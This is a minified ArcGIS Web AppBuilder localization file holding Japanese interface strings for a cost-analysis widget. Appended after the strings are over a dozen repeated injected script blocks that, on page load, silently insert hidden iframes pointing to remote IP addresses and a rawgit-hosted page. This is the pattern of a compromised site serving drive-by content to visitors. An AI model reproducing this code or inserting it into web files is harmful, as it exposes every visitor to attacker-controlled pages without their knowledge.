// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"\u69cb\u6210\u30c6\u30ad\u30b9\u30c8\u306e\u8a2d\u5b9a:",generalSettings:{tabTitle:"\u4e00\u822c\u8a2d\u5b9a",measurementUnitLabel:"\u8a08\u6e2c\u5358\u4f4d",currencyLabel:"\u8a08\u6e2c\u30b7\u30f3\u30dc\u30eb",roundCostLabel:"\u30b3\u30b9\u30c8\u3092\u4e38\u3081\u308b",projectOutputSettings:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u51fa\u529b\u8a2d\u5b9a",typeOfProjectAreaLabel:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8 \u30a8\u30ea\u30a2\u306e\u30bf\u30a4\u30d7",
bufferDistanceLabel:"\u30d0\u30c3\u30d5\u30a1\u30fc\u8ddd\u96e2",roundCostValues:{twoDecimalPoint:"\u5c0f\u6570\u70b9\u4ee5\u4e0b 2 \u6841",nearestWholeNumber:"\u6700\u3082\u8fd1\u3044\u6574\u6570",nearestTen:"10 \u306e\u4f4d\u307e\u3067\u306e\u6982\u6570",nearestHundred:"100 \u306e\u4f4d\u307e\u3067\u306e\u6982\u6570",nearestThousand:"1,000 \u306e\u4f4d\u307e\u3067\u306e\u6982\u6570",nearestTenThousands:"10,000 \u306e\u4f4d\u307e\u3067\u306e\u6982\u6570"},projectAreaType:{outline:"\u30a2\u30a6\u30c8\u30e9\u30a4\u30f3",
buffer:"\u30d0\u30c3\u30d5\u30a1\u30fc"},errorMessages:{currency:"\u7121\u52b9\u306a\u901a\u8ca8\u5358\u4f4d",bufferDistance:"\u7121\u52b9\u306a\u30d0\u30c3\u30d5\u30a1\u30fc\u8ddd\u96e2",outOfRangebufferDistance:"0 \u3088\u308a\u5927\u304d\u304f 100 \u4ee5\u4e0b\u306e\u5024\u3067\u306a\u3051\u308c\u3070\u306a\u308a\u307e\u305b\u3093"}},projectSettings:{tabTitle:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u8a2d\u5b9a",costingGeometrySectionTitle:"\u30b3\u30b9\u30c8\u89e3\u6790\u306e\u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u306e\u5b9a\u7fa9 (\u30aa\u30d7\u30b7\u30e7\u30f3)",
costingGeometrySectionNote:"\u6ce8\u610f: \u3053\u306e\u30ec\u30a4\u30e4\u30fc\u3092\u69cb\u6210\u3059\u308b\u3068\u3001\u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u306b\u57fa\u3065\u3044\u3066\u30d5\u30a3\u30fc\u30c1\u30e3 \u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u306e\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f\u3092\u8a2d\u5b9a\u3067\u304d\u307e\u3059\u3002",projectTableSectionTitle:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u4fdd\u5b58/\u8aad\u307f\u8fbc\u307f\u8a2d\u5b9a\u6a5f\u80fd (\u30aa\u30d7\u30b7\u30e7\u30f3)",
projectTableSectionNote:"\u6ce8\u610f: \u3059\u3079\u3066\u306e\u30c6\u30fc\u30d6\u30eb\u3068\u30ec\u30a4\u30e4\u30fc\u3092\u69cb\u6210\u3059\u308b\u3068\u3001\u5f8c\u3067\u4f7f\u7528\u3067\u304d\u308b\u3088\u3046\u306b\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u3092\u4fdd\u5b58/\u8aad\u307f\u8fbc\u3080\u3053\u3068\u304c\u3067\u304d\u307e\u3059\u3002",costingGeometryLayerLabel:"\u30b3\u30b9\u30c8\u89e3\u6790\u30b8\u30aa\u30e1\u30c8\u30ea \u30ec\u30a4\u30e4\u30fc",fieldLabelGeography:"\u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u306b\u30e9\u30d9\u30eb\u4ed8\u3051\u3059\u308b\u30d5\u30a3\u30fc\u30eb\u30c9",
projectAssetsTableLabel:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8 \u30a2\u30bb\u30c3\u30c8 \u30c6\u30fc\u30d6\u30eb",projectMultiplierTableLabel:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u4e57\u7b97\u8ffd\u52a0\u30b3\u30b9\u30c8 \u30c6\u30fc\u30d6\u30eb",projectLayerLabel:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8 \u30ec\u30a4\u30e4\u30fc",configureFieldsLabel:"\u30d5\u30a3\u30fc\u30eb\u30c9\u306e\u69cb\u6210",fieldDescriptionHeaderTitle:"\u8aac\u660e\u30d5\u30a3\u30fc\u30eb\u30c9",layerFieldsHeaderTitle:"\u30ec\u30a4\u30e4\u30fc \u30d5\u30a3\u30fc\u30eb\u30c9",
selectLabel:"\u9078\u629e",errorMessages:{duplicateLayerSelection:"${layerName} \u306f\u3059\u3067\u306b\u9078\u629e\u3055\u308c\u3066\u3044\u307e\u3059",invalidConfiguration:"${fieldsString} \u3092\u9078\u629e\u3057\u3066\u304f\u3060\u3055\u3044"},costingGeometryHelp:"\x3cp\x3e\u6b21\u306e\u6761\u4ef6\u3092\u6e80\u305f\u3059\u30dd\u30ea\u30b4\u30f3 \u30ec\u30a4\u30e4\u30fc\u304c\u8868\u793a\u3055\u308c\u307e\u3059: \x3cbr/\x3e \x3cli\x3e\t\u30ec\u30a4\u30e4\u30fc\u306f\u300c\u30af\u30a8\u30ea\u300d\u6a5f\u80fd\u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\x3c/li\x3e\x3cli\x3e\t\u30ec\u30a4\u30e4\u30fc\u306f GlobalID \u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\x3c/li\x3e\x3c/p\x3e",
fieldToLabelGeographyHelp:"\x3cp\x3e\u9078\u629e\u3057\u305f\u300c\u30b3\u30b9\u30c8\u89e3\u6790\u30b8\u30aa\u30e1\u30c8\u30ea \u30ec\u30a4\u30e4\u30fc\u300d\u306e\u6587\u5b57\u5217\u304a\u3088\u3073\u6570\u5024\u30d5\u30a3\u30fc\u30eb\u30c9\u306f\u3001[\u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u306b\u30e9\u30d9\u30eb\u4ed8\u3051\u3059\u308b\u30d5\u30a3\u30fc\u30eb\u30c9] \u30c9\u30ed\u30c3\u30d7\u30c0\u30a6\u30f3\u306b\u8868\u793a\u3055\u308c\u307e\u3059\u3002\x3c/p\x3e",projectAssetsTableHelp:"\x3cp\x3e\u6b21\u306e\u6761\u4ef6\u3092\u6e80\u305f\u3059\u30c6\u30fc\u30d6\u30eb\u304c\u8868\u793a\u3055\u308c\u307e\u3059: \x3cbr/\x3e \x3cli\x3e\u30c6\u30fc\u30d6\u30eb\u306f\u7de8\u96c6\u6a5f\u80fd (\u3064\u307e\u308a\u3001\u4f5c\u6210\u3001\u524a\u9664\u3001\u66f4\u65b0) \u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\x3c/li\x3e    \x3cli\x3e\u30c6\u30fc\u30d6\u30eb\u306f\u3001\u6b21\u306e\u540d\u524d\u304a\u3088\u3073\u30c7\u30fc\u30bf \u30bf\u30a4\u30d7\u306e 6 \u3064\u306e\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (GUID \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tCostEquation (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tScenario (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tTemplateName (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e    GeographyGUID (GUID \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tProjectGUID (GUID \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3e\u6b21\u306e\u6761\u4ef6\u3092\u6e80\u305f\u3059\u30c6\u30fc\u30d6\u30eb\u304c\u8868\u793a\u3055\u308c\u307e\u3059: \x3cbr/\x3e \x3cli\x3e\u30c6\u30fc\u30d6\u30eb\u306f\u7de8\u96c6\u6a5f\u80fd (\u3064\u307e\u308a\u3001\u4f5c\u6210\u3001\u524a\u9664\u3001\u66f4\u65b0) \u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\x3c/li\x3e    \x3cli\x3e\u30c6\u30fc\u30d6\u30eb\u306f\u3001\u6b21\u306e\u540d\u524d\u304a\u3088\u3073\u30c7\u30fc\u30bf \u30bf\u30a4\u30d7\u306e 5 \u3064\u306e\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tType (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tValue (Float/Double \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e\tCostindex (\u6574\u6570\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (GUID \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3e\u6b21\u306e\u6761\u4ef6\u3092\u6e80\u305f\u3059\u30dd\u30ea\u30b4\u30f3 \u30ec\u30a4\u30e4\u30fc\u304c\u8868\u793a\u3055\u308c\u307e\u3059: \x3cbr/\x3e \x3cli\x3e\u30ec\u30a4\u30e4\u30fc\u306f\u7de8\u96c6\u6a5f\u80fd (\u3064\u307e\u308a\u3001\u4f5c\u6210\u3001\u524a\u9664\u3001\u66f4\u65b0) \u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059:\u009d\x3c/li\x3e    \x3cli\x3e\u30ec\u30a4\u30e4\u30fc\u306f\u3001\u6b21\u306e\u540d\u524d\u304a\u3088\u3073\u30c7\u30fc\u30bf \u30bf\u30a4\u30d7\u306e 5 \u3064\u306e\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u6301\u3064\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3eDescription (\u6587\u5b57\u5217\u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3eTotalassetcost (Float/Double \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Float/Double \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3cli\x3eGlobalID (GlobalID \u30bf\u30a4\u30d7 \u30d5\u30a3\u30fc\u30eb\u30c9)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"\u30ec\u30a4\u30e4\u30fc\u8a2d\u5b9a",layerNameHeaderTitle:"\u30ec\u30a4\u30e4\u30fc\u540d(L)",layerNameHeaderTooltip:"\u30de\u30c3\u30d7\u5185\u306e\u30ec\u30a4\u30e4\u30fc\u306e\u30ea\u30b9\u30c8",EditableLayerHeaderTitle:"\u7de8\u96c6\u53ef\u80fd",EditableLayerHeaderTooltip:"\u30ec\u30a4\u30e4\u30fc\u3068\u305d\u306e\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u3092\u30b3\u30b9\u30c8\u89e3\u6790\u30a6\u30a3\u30b8\u30a7\u30c3\u30c8\u306b\u542b\u3081\u308b",SelectableLayerHeaderTitle:"\u9078\u629e\u53ef\u80fd",
SelectableLayerHeaderTooltip:"\u30d5\u30a3\u30fc\u30c1\u30e3\u304b\u3089\u306e\u30b8\u30aa\u30e1\u30c8\u30ea\u3092\u4f7f\u7528\u3057\u3066\u65b0\u3057\u3044\u30b3\u30b9\u30c8 \u30a2\u30a4\u30c6\u30e0\u3092\u4f5c\u6210\u3067\u304d\u307e\u3059",fieldPickerHeaderTitle:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8 ID (\u30aa\u30d7\u30b7\u30e7\u30f3)",fieldPickerHeaderTooltip:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8 ID \u3092\u683c\u7d0d\u3059\u308b (\u6587\u5b57\u5217\u30bf\u30a4\u30d7\u306e) \u30aa\u30d7\u30b7\u30e7\u30f3 \u30d5\u30a3\u30fc\u30eb\u30c9",
selectLabel:"\u9078\u629e",noAssetLayersAvailable:"\u9078\u629e\u3057\u305f Web \u30de\u30c3\u30d7\u306b\u30a2\u30bb\u30c3\u30c8 \u30ec\u30a4\u30e4\u30fc\u304c\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f",disableEditableCheckboxTooltip:"\u3053\u306e\u30ec\u30a4\u30e4\u30fc\u306b\u306f\u7de8\u96c6\u6a5f\u80fd\u304c\u3042\u308a\u307e\u305b\u3093"},costingInfo:{tabTitle:"\u30b3\u30b9\u30c8\u89e3\u6790\u60c5\u5831",proposedMainsLabel:"\u63d0\u6848\u6e08\u307f\u30e1\u30a4\u30f3",addCostingTemplateLabel:"\u30b3\u30b9\u30c8\u89e3\u6790\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u306e\u8ffd\u52a0",
manageScenariosTitle:"\u30b7\u30ca\u30ea\u30aa\u306e\u7ba1\u7406",featureTemplateTitle:"\u30d5\u30a3\u30fc\u30c1\u30e3 \u30c6\u30f3\u30d7\u30ec\u30fc\u30c8",costEquationTitle:"\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f",geographyTitle:"\u30b8\u30aa\u30b0\u30e9\u30d5\u30a3",scenarioTitle:"\u30b7\u30ca\u30ea\u30aa",actionTitle:"\u64cd\u4f5c",scenarioNameLabel:"\u30b7\u30ca\u30ea\u30aa\u540d",addBtnLabel:"\u8ffd\u52a0",srNoLabel:"\u3044\u3044\u3048\u3002",deleteLabel:"\u524a\u9664",duplicateScenarioName:"\u30b7\u30ca\u30ea\u30aa\u540d\u306e\u8907\u88fd",
hintText:"\x3cdiv\x3e\u30d2\u30f3\u30c8: \u6b21\u306e\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u4f7f\u7528\u3057\u307e\u3059\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: \u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u3067\u540c\u3058\u30bf\u30a4\u30d7\u306e\u30a2\u30bb\u30c3\u30c8\u306e\u5408\u8a08\u6570\u3092\u4f7f\u7528\u3057\u307e\u3059\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: \u30e9\u30a4\u30f3 \u30a2\u30bb\u30c3\u30c8\u306e\u9577\u3055\u3068\u30dd\u30ea\u30b4\u30f3 \u30a2\u30bb\u30c3\u30c8\u306e\u9762\u7a4d\u3092\u4f7f\u7528\u3057\u307e\u3059\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: \u30b8\u30aa\u30b0\u30e9\u30d5\u30a3\u3067\u540c\u3058\u30bf\u30a4\u30d7\u306e\u30e9\u30a4\u30f3 \u30a2\u30bb\u30c3\u30c8\u306e\u5168\u9577\u3068\u30dd\u30ea\u30b4\u30f3 \u30a2\u30bb\u30c3\u30c8\u306e\u5408\u8a08\u9762\u7a4d\u3092\u4f7f\u7528\u3057\u307e\u3059\x3c/li\x3e\x3c/ul\x3e \u6b21\u306e\u3088\u3046\u306a\u95a2\u6570\u3092\u4f7f\u7528\u3067\u304d\u307e\u3059:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3e\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u30cb\u30fc\u30ba\u306b\u5fdc\u3058\u3066\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f\u3092\u7de8\u96c6\u3057\u3066\u304f\u3060\u3055\u3044\u3002",
noneValue:"\u306a\u3057",requiredCostEquation:"${layerName} \u306e\u7121\u52b9\u306a\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f: ${templateName}",duplicateTemplateMessage:"\u91cd\u8907\u3059\u308b\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8 \u30a8\u30f3\u30c8\u30ea\u304c ${layerName} \u306b\u5bfe\u3057\u3066\u5b58\u5728\u3057\u307e\u3059: ${templateName}",defaultEquationRequired:"${layerName} \u306e\u30c7\u30d5\u30a9\u30eb\u30c8\u306e\u65b9\u7a0b\u5f0f\u304c\u5fc5\u8981\u3067\u3059: ${templateName}",validCostEquationMessage:"\u6709\u52b9\u306a\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044",
costEquationHelpText:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u30cb\u30fc\u30ba\u306b\u5fdc\u3058\u3066\u30b3\u30b9\u30c8\u65b9\u7a0b\u5f0f\u3092\u7de8\u96c6\u3057\u3066\u304f\u3060\u3055\u3044",scenarioHelpText:"\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u30cb\u30fc\u30ba\u306b\u5fdc\u3058\u3066\u30b7\u30ca\u30ea\u30aa\u3092\u9078\u629e\u3057\u3066\u304f\u3060\u3055\u3044",copyRowTitle:"\u884c\u306e\u30b3\u30d4\u30fc",noTemplateAvailable:"${layerName} \u306e\u30c6\u30f3\u30d7\u30ec\u30fc\u30c8\u3092\u5c11\u306a\u304f\u3068\u3082 1 \u3064\u8ffd\u52a0\u3057\u3066\u304f\u3060\u3055\u3044",
manageScenarioLabel:"\u30b7\u30ca\u30ea\u30aa\u306e\u7ba1\u7406",noLayerMessage:"${tabName} \u3067\u5c11\u306a\u304f\u3068\u3082 1 \u3064\u306e\u30ec\u30a4\u30e4\u30fc\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044",noEditableLayersAvailable:"\u30ec\u30a4\u30e4\u30fc\u8a2d\u5b9a\u30bf\u30d6\u3067\u30ec\u30a4\u30e4\u30fc\u304c\u7de8\u96c6\u53ef\u80fd\u3067\u3042\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3059\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059"},statisticsSettings:{tabTitle:"\u7d71\u8a08\u60c5\u5831\u306e\u8a2d\u5b9a",
addStatisticsLabel:"\u7d71\u8a08\u60c5\u5831\u306e\u8ffd\u52a0",fieldNameTitle:"\u30d5\u30a3\u30fc\u30eb\u30c9",statisticsTitle:"\u30e9\u30d9\u30eb",addNewStatisticsText:"\u65b0\u3057\u3044\u7d71\u8a08\u60c5\u5831\u306e\u8ffd\u52a0",deleteStatisticsText:"\u7d71\u8a08\u60c5\u5831\u306e\u524a\u9664",moveStatisticsUpText:"\u7d71\u8a08\u60c5\u5831\u3092\u4e0a\u306b\u79fb\u52d5",moveStatisticsDownText:"\u7d71\u8a08\u60c5\u5831\u3092\u4e0b\u306b\u79fb\u52d5",selectDeselectAllTitle:"\u3059\u3079\u3066\u9078\u629e"},
statisticsType:{countLabel:"\u6570",averageLabel:"\u5e73\u5747\u5024",maxLabel:"\u6700\u5927",minLabel:"\u6700\u5c0f",summationLabel:"\u96c6\u7d04",areaLabel:"\u30dd\u30ea\u30b4\u30f3",lengthLabel:"\u30e9\u30a4\u30f3"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});